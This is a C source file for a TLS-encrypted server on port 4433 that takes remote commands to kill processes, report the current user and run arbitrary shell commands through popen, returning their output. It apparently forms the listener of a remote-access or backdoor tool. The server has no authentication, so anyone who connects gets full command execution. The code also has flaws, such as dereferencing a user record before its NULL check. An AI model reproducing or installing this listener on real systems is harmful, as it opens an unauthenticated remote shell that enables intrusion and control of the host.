#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <string.h>
#include <sys/signal.h>
#include <errno.h>
#include <pwd.h>

//---------------------------------------------------------------------------------------------------------------

#include "../config.h"

//---------------------------------------------------------------------------------------------------------------

#define CERT_FILE "../cert.pem"
#define KEY_FILE "../key.pem"

//---------------------------------------------------------------------------------------------------------------

int create_socket(int port) { 
	int s;
	struct sockaddr_in addr;

	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = htonl(INADDR_ANY);

	s = socket(AF_INET, SOCK_STREAM, 0);
	if (s < 0) {
		perror("Unable to create socket");
		exit(EXIT_FAILURE);
	}

	if (bind(s, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
		perror("Unable to bind");
		exit(EXIT_FAILURE);
	}

	if (listen(s, 1) < 0) {
		perror("Unable to listen");
		exit(EXIT_FAILURE);
	}

	return s;
}

//---------------------------------------------------------------------------------------------------------------

void init_openssl() { 
	SSL_load_error_strings();	
	OpenSSL_add_ssl_algorithms();
}

//---------------------------------------------------------------------------------------------------------------

void cleanup_openssl() {
	EVP_cleanup();
}

//---------------------------------------------------------------------------------------------------------------

SSL_CTX *create_context() {
	const SSL_METHOD *method;
	SSL_CTX *ctx;

	method = SSLv23_server_method();

	ctx = SSL_CTX_new(method);
	if (!ctx) {
		perror("Unable to create SSL context");
		ERR_print_errors_fp(stderr);
		exit(EXIT_FAILURE);
	}

	return ctx;
}

//---------------------------------------------------------------------------------------------------------------

void configure_context(SSL_CTX *ctx) {
	SSL_CTX_set_ecdh_auto(ctx, 1);

	if (SSL_CTX_use_certificate_file(ctx, CERT_FILE, SSL_FILETYPE_PEM) <= 0) {
		ERR_print_errors_fp(stderr);
		exit(EXIT_FAILURE);
	}

	if (SSL_CTX_use_PrivateKey_file(ctx, KEY_FILE, SSL_FILETYPE_PEM) <= 0 ) {
		ERR_print_errors_fp(stderr);
		exit(EXIT_FAILURE);
	}
}

//---------------------------------------------------------------------------------------------------------------

void parse_command(SSL *ssl, char *buf, int len) {
	if (strncmp(buf, CMD_KILL, strlen(CMD_KILL)) == 0) {
		buf = buf + strlen(CMD_KILL) + 1;
		int pid = atoi(buf);
		int ret = kill((pid_t) pid, SIGKILL);
		
		if (ret == -1) {
			switch (errno) {					
				case EPERM:
					SSL_write(ssl, ERR_EPERM, strlen(ERR_EPERM));
					break;
					
				case ESRCH:
					SSL_write(ssl, ERR_ESRCH, strlen(ERR_ESRCH));
					break;
				
				default:
					SSL_write(ssl, ERR_UNCAUGHT, strlen(ERR_UNCAUGHT));
					break;
			}
			return;
		}
		
		SSL_write(ssl, CMD_SUCCESS, strlen(CMD_SUCCESS));
		
	} else if (strncmp(buf, CMD_WHOAMI, strlen(CMD_WHOAMI)) == 0) {
		register struct passwd *pw;
		register uid_t uid;
		char output[1024] = {0};
		
		uid = geteuid();
		pw = getpwuid(uid);
		snprintf(output, sizeof(output), CMD_WHOAMI_RET "%s\n", pw->pw_name);
		
		if (pw) {
			SSL_write(ssl, output, strlen(output));
		} else {
			SSL_write(ssl, ERR_WHOAMI, strlen(ERR_WHOAMI));
		}
	} else if (strncmp(buf, CMD_EXEC, strlen(CMD_EXEC)) == 0) {
		buf = buf + strlen(CMD_EXEC) + 1;
		
		FILE *fp;
		char output[2048] = {0};
		
		fp = popen(buf, "r");
		fread(output, 1, sizeof(output), fp);
		fclose(fp);
	
		SSL_write(ssl, output, strlen(output));
	} else {
		SSL_write(ssl, CMD_NO_RECON, strlen(CMD_NO_RECON));
	}
}

//---------------------------------------------------------------------------------------------------------------

int main(int argc, char **argv) {
	int sock;
	SSL_CTX *ctx;

	init_openssl();
	ctx = create_context();
	configure_context(ctx);

	sock = create_socket(4433);

	while(1) {
		struct sockaddr_in addr;
		uint len = sizeof(addr);
		SSL *ssl;
		char recv_buffer[1024] = {0};

		int client = accept(sock, (struct sockaddr*)&addr, &len);
		if (client < 0) {
			perror("Unable to accept");
			exit(EXIT_FAILURE);
		}

		ssl = SSL_new(ctx);
		SSL_set_fd(ssl, client);

		if (SSL_accept(ssl) <= 0) {
			ERR_print_errors_fp(stderr);
			break;
		}
		
		while (1) {
			SSL_read(ssl, recv_buffer, sizeof(recv_buffer));
			if (strncmp(recv_buffer, CMD_EXIT, strlen(CMD_EXIT)) == 0)
				break;
			parse_command(ssl, recv_buffer, strlen(recv_buffer));
			memset(recv_buffer, 0, sizeof(recv_buffer));
		}

		SSL_free(ssl);
		close(client);
	}

	close(sock);
	SSL_CTX_free(ctx);
	cleanup_openssl();
}

